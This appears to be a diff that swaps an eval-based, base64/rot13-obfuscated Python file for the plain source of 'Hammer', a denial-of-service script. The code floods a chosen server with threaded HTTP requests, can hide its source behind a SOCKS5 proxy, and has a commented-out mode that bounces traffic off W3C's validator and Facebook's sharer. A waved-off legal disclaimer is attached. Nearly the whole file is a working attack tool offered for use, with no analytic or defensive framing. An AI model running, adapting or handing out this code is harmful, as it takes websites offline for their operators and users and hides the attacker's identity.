@@ -1,11 +1,178 @@
-# Python code obfuscated by www.development-tools.net
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
 
+from queue import Queue
+from optparse import OptionParser
+import time,sys,socket,threading,logging,urllib.request,random
 
-import base64, codecs
-magic = 'IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwojIC0qLSBjb2Rpbmc6IHV0Zi04IC0qLQoKZnJvbSBxdWV1ZSBpbXBvcnQgUXVldWUKZnJvbSBvcHRwYXJzZSBpbXBvcnQgT3B0aW9uUGFyc2VyCmltcG9ydCB0aW1lLHN5cyxzb2NrZXQsdGhyZWFkaW5nLGxvZ2dpbmcsdXJsbGliLnJlcXVlc3QscmFuZG9tCgpkZWYgdXNlcl9hZ2VudCgpOgogICAgZ2xvYmFsIHVhZ2VudAogICAgdWFnZW50PVtdCiAgICB1YWdlbnQuYXBwZW5kKCJNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4wKSBPcGVyYSAxMi4xNCIpCiAgICB1YWdlbnQuYXBwZW5kKCJNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IGk2ODY7IHJ2OjI2LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMjYuMCIpCiAgICB1YWdlbnQuYXBwZW5kKCJNb3ppbGxhLzUuMCAoWDExOyBVOyBMaW51eCB4ODZfNjQ7IGVuLVVTOyBydjoxLjkuMS4zKSBHZWNrby8yMDA5MDkxMyBGaXJlZm94LzMuNS4zIikKICAgIHVhZ2VudC5hcHBlbmQoIk1vemlsbGEvNS4wIChXaW5kb3dzOyBVOyBXaW5kb3dzIE5UIDYuMTsgZW47IHJ2OjEuOS4xLjMpIEdlY2tvLzIwMDkwODI0IEZpcmVmb3gvMy41LjMgKC5ORVQgQ0xSIDMuNS4zMDcyOSkiKQogICAgdWFnZW50LmFwcGVuZCgiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4yKSBBcHBsZVdlYktpdC81MzUuNyAoS0hUTUwsIGxpa2UgR2Vja28pIENvbW9kb19EcmFnb24vMTYuMS4xLjAgQ2hyb21lLzE2LjAuOTEyLjYzIFNhZmFyaS81MzUuNyIpCiAgICB1YWdlbnQuYXBwZW5kKCJNb3ppbGxhLzUuMCAoV2luZG93czsgVTsgV2luZG93cyBOVCA1LjI7IGVuLVVTOyBydjoxLjkuMS4zKSBHZWNrby8yMDA5MDgyNCBGaXJlZm94LzMuNS4zICguTkVUIENMUiAzLjUuMzA3MjkpIikKICAgIHVhZ2VudC5hcHBlbmQoIk1vemlsbGEvNS4wIChXaW5kb3dzOyBVOyBXaW5kb3dzIE5UIDYuMTsgZW4tVVM7IHJ2OjEuOS4xLjEpIEdlY2tvLzIwMDkwNzE4IEZpcmVmb3gvMy41LjEiKQogICAgcmV0dXJuKHVhZ2VudCkKCmRlZiBteV9ib3RzKCk6CiAgICBnbG9iYWwgYm90cwogICAgYm90cz1bXQogICAgYm90cy5hcHBlbmQoImh0dHA6Ly92YWxpZGF0b3IudzMub3JnL2NoZWNrP3VyaT0iKQogICAgYm90cy5hcHBlbmQoImh0dHA6Ly93d3cuZmFjZWJvb2suY29tL3NoYXJlci9zaGFyZXIucGhwP3U9IikKICAgIHJldHVybihib3RzKQoKZGVmIGJvdF9oYW1tZXJpbmcodXJsKToKICAgIHRyeToKICAgICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgICByZXEgPSB1cmxsaWIucmVxdWVzdC51cmxvcGVuKHVybGxpYi5yZXF1ZXN0LlJlcXVlc3QodXJsLGhlYWRlcnM9eydVc2VyLUFnZW50JzogcmFuZG9tLmNob2ljZSh1YWdlbnQpfSkpCiAgICAgICAgICAgIHByaW50KCJcMDMzWzk0bWJvdCBpcyBoYW1tZXJpbmcuLi5cMDMzWzBtIikKICAgICAgICAgICAgdGltZS5zbGVlcCguMSkKICAgIGV4Y2VwdDoKICAgICAgICB0aW1lLnNsZWVwKC4xKQoKZGVmIGRvd25faXQoaXRlbSk6CiAgICB0cnk6CiAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICAgcGFja2V0ID0gc3RyKCJHRVQgLyBIVFRQLzEu'
-love = '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'
-god = 'SGFtbWVycyIpCiAgICBvcHRwLmFkZF9vcHRpb24oIi1xIiwiLS1xdWlldCIsIGhlbHA9InNldCBsb2dnaW5nIHRvIEVSUk9SIixhY3Rpb249InN0b3JlX2NvbnN0IiwgZGVzdD0ibG9nbGV2ZWwiLGNvbnN0PWxvZ2dpbmcuRVJST1IsIGRlZmF1bHQ9bG9nZ2luZy5JTkZPKQogICAgb3B0cC5hZGRfb3B0aW9uKCItcyIsIi0tc2VydmVyIiwgZGVzdD0iaG9zdCIsaGVscD0iYXR0YWNrIHRvIHNlcnZlciBpcCAtcyBpcCIpCiAgICBvcHRwLmFkZF9vcHRpb24oIi1wIiwiLS1wb3J0Iix0eXBlPSJpbnQiLGRlc3Q9InBvcnQiLGhlbHA9Ii1wIDgwIGRlZmF1bHQgODAiKQogICAgb3B0cC5hZGRfb3B0aW9uKCItdCIsIi0tdHVyYm8iLHR5cGU9ImludCIsZGVzdD0idHVyYm8iLGhlbHA9ImRlZmF1bHQgMTM1IC10IDEzNSIpCiAgICBvcHRwLmFkZF9vcHRpb24oIi14IiwiLS11c2Vwcm94eSIsYWN0aW9uPSdzdG9yZV90cnVlJyxkZXN0PSJ1c2Vwcm94eSIsaGVscD0iVXNlIGEgU09DS1M1IHByb3h5IGZvciBjb25uZWN0aW5nIixkZWZhdWx0PUZhbHNlKQogICAgb3B0cC5hZGRfb3B0aW9uKCItLXByb3h5LWhvc3QiLGRlc3Q9InByb3h5X2hvc3QiLGhlbHA9IlNPQ0tTNSBwcm94eSBob3N0IixkZWZhdWx0PSIxMjcuMC4wLjEiKQogICAgb3B0cC5hZGRfb3B0aW9uKCItLXByb3h5LXBvcnQiLGRlc3Q9InByb3h5X3BvcnQiLGhlbHA9IlNPQ0tTNSBwcm94eSBwb3J0Iix0eXBlPWludCxkZWZhdWx0PTkxNTApCiAgICBvcHRwLmFkZF9vcHRpb24oIi1oIiwiLS1oZWxwIixkZXN0PSJoZWxwIixhY3Rpb249J3N0b3JlX3RydWUnLGhlbHA9ImhlbHAgeW91IikKICAgIG9wdHMsIGFyZ3MgPSBvcHRwLnBhcnNlX2FyZ3MoKQogICAgbG9nZ2luZy5iYXNpY0NvbmZpZyhsZXZlbD1vcHRzLmxvZ2xldmVsLGZvcm1hdD0nJShsZXZlbG5hbWUpLThzICUobWVzc2FnZSlzJykKICAgIGlmIG9wdHMuaGVscDoKICAgICAgICB1c2FnZSgpCiAgICBpZiBvcHRzLmhvc3QgaXMgbm90IE5vbmU6CiAgICAgICAgaG9zdCA9IG9wdHMuaG9zdAogICAgZWxzZToKICAgICAgICB1c2FnZSgpCiAgICBpZiBvcHRzLnBvcnQgaXMgTm9uZToKICAgICAgICBwb3J0ID0gODAKICAgIGVsc2U6CiAgICAgICAgcG9ydCA9IG9wdHMucG9ydAogICAgaWYgb3B0cy50dXJibyBpcyBOb25lOgogICAgICAgIHRociA9IDEzNQogICAgZWxzZToKICAgICAgICB0aHIgPSBvcHRzLnR1cmJvCgogICAgdXNlcHJveHkgPSBvcHRzLnVzZXByb3h5CiAgICBwcm94eV9ob3N0ID0gb3B0cy5wcm94eV9ob3N0CiAgICBwcm94eV9wb3J0ID0gb3B0cy5wcm94eV9wb3J0CgojIHJlYWRpbmcgaGVhZGVycwpnbG9iYWwgZGF0YQpoZWFkZXJzID0gb3BlbigiaGVhZGVycy50eHQiLCAiciIpCmRhdGEgPSBoZWFkZXJzLnJlYWQoKQpoZWFkZXJzLmNsb3NlKCkKI3Rhc2sgcXVldWUgYXJlIHEsdwpxID0gUXVldWUoKQp3ID0gUXVldWUoKQoKaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKICAgIGlmIGxlbihzeXMuYXJndikgPCAyOgogICAgICAgIHVzYWdlKCkKICAgIGdldF9wYXJhbWV0ZXJzKCkKICAgIHByaW50KCJcMDMzWzkybSIsaG9zdCwiIHBvcnQ6ICIsc3RyKHBvcnQp'
-destiny = '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'
-joy = '\x72\x6f\x74\x31\x33'
-trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
-eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
+def user_agent():
+    global uagent
+    uagent=[]
+    uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
+    uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
+    uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
+    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
+    uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
+    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
+    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
+    return(uagent)
+
+def my_bots():
+    global bots
+    bots=[]
+    bots.append("http://validator.w3.org/check?uri=")
+    bots.append("http://www.facebook.com/sharer/sharer.php?u=")
+    return(bots)
+
+def bot_hammering(url):
+    try:
+        while True:
+            req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
+            print("\033[94mbot is hammering...\033[0m")
+            time.sleep(.1)
+    except:
+        time.sleep(.1)
+
+def down_it(item):
+    try:
+        while True:
+            packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((host,int(port)))
+            if s.sendto( packet, (host, int(port)) ):
+                s.shutdown(1)
+                print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--packet sent! hammering--> \033[0m")
+            else:
+                s.shutdown(1)
+                print("\033[91mShut<->Down\033[0m")
+            time.sleep(.1)
+    except socket.error as e:
+        print("\033[91mNO Connection! Server Maybe Down\033[0m")
+        #print("\033[91m",e,"\033[0m")
+        time.sleep(.1)
+
+def dos():
+    while True:
+        item = q.get()
+        down_it(item)
+        q.task_done()
+
+def dos2():
+    while True:
+        item=w.get()
+        bot_hammering(random.choice(bots)+"http://"+host)
+        w.task_done()
+
+def usage():
+    print (''' \033[92m	Hammer Dos Script v1.1.0
+	It is the end user's responsibility to obey all applicable laws.
+	It is just for server testing script. Bla bla bla... \n
+	usage : python3 hammer.py [-s] [-p] [-t] [-x] [--proxy-host] [--proxy-port]
+	-h : help
+	-s : server ip
+	-p : port default 80
+	-t : turbo default 135
+	-x : use socks5 proxy
+	--proxy-host, : socks5 proxy host default 127.0.0.1
+	--proxy-port, : socks5 proxyvport default 9150 \033[0m''')
+    sys.exit()
+
+def get_parameters():
+    global host
+    global port
+    global thr
+    global item
+    global useproxy
+    global proxy_host
+    global proxy_port
+    optp = OptionParser(add_help_option=False,epilog="Hammers")
+    optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
+    optp.add_option("-s","--server", dest="host",help="attack to server ip -s ip")
+    optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
+    optp.add_option("-t","--turbo",type="int",dest="turbo",help="default 135 -t 135")
+    optp.add_option("-x","--useproxy",action='store_true',dest="useproxy",help="Use a SOCKS5 proxy for connecting",default=False)
+    optp.add_option("--proxy-host",dest="proxy_host",help="SOCKS5 proxy host",default="127.0.0.1")
+    optp.add_option("--proxy-port",dest="proxy_port",help="SOCKS5 proxy port",type=int,default=9150)
+    optp.add_option("-h","--help",dest="help",action='store_true',help="help you")
+    opts, args = optp.parse_args()
+    logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
+    if opts.help:
+        usage()
+    if opts.host is not None:
+        host = opts.host
+    else:
+        usage()
+    if opts.port is None:
+        port = 80
+    else:
+        port = opts.port
+    if opts.turbo is None:
+        thr = 135
+    else:
+        thr = opts.turbo
+
+    useproxy = opts.useproxy
+    proxy_host = opts.proxy_host
+    proxy_port = opts.proxy_port
+
+# reading headers
+global data
+headers = open("headers.txt", "r")
+data = headers.read()
+headers.close()
+#task queue are q,w
+q = Queue()
+w = Queue()
+
+if __name__ == '__main__':
+    if len(sys.argv) < 2:
+        usage()
+    get_parameters()
+    print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
+    print("\033[94mPlease Wait...\033[0m")
+    user_agent()
+    my_bots()
+    time.sleep(5)
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((host,int(port)))
+        s.settimeout(1)
+    except socket.error as e:
+        print("\033[91mCheck Server IP And Port\033[0m")
+        usage()
+
+    if useproxy:
+        # Tries to import to external "socks" library
+        # and monkey patches socket.socket to connect over
+        # the proxy by default
+        try:
+            import socks
+
+            socks.setdefaultproxy(
+                socks.PROXY_TYPE_SOCKS5, proxy_host, proxy_port
+            )
+            socket.socket = socks.socksocket
+            print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m Using SOCKS5 proxy for connecting... \033[0m")
+        except ImportError:
+            print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m Socks Proxy Library Not Available! \033[0m")
+
+    while True:
+        for i in range(int(thr)):
+            t = threading.Thread(target=dos)
+            t.daemon = True  # if thread is exist, it dies
+            t.start()
+            # t2 = threading.Thread(target=dos2)
+            # t2.daemon = True  # if thread is exist, it dies
+            # t2.start()
+        start = time.time()
+        #tasking
+        item = 0
+        while True:
+            if (item>1800): # for no memory crash
+                item=0
+                time.sleep(.1)
+            item = item + 1
+            q.put(item)
+            w.put(item)
+        q.join()
+        w.join()
